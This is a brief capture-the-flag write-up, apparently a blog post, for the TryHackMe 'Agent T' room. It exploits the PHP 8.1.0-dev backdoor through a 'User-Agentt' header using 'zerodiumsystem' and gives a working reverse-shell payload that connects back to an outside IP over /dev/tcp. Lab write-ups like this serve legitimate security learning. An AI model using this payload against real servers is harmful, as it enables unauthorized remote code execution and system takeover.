---
title: Agent T
description: 'PHP v8.1.0-dev backdoor'
pubDate: 2023-06-29
category: 'tryhackme'
tags: ['php', 'v8.1.0-dev', 'zerodiumsystem']
image: 'https://tryhackme-images.s3.amazonaws.com/room-icons/5dbc4e7d8515e7bc05b7742f26944ae9.png'
---

Looking at the response headers we see:
```
X-Powered-By: PHP/8.1.0-dev
```

This version has a backdoor (https://www.exploit-db.com/exploits/49933) which we can abuse.

It uses the uses a second special `User-Agentt` header to execute code.

```
"User-Agentt": "zerodiumsystem('<cmd>);"
```

Getting a reverse shell:
```
User-Agentt: zerodiumsystem('bash -c "bash -i >& /dev/tcp/10.8.119.137/4444 0>&1"');
```
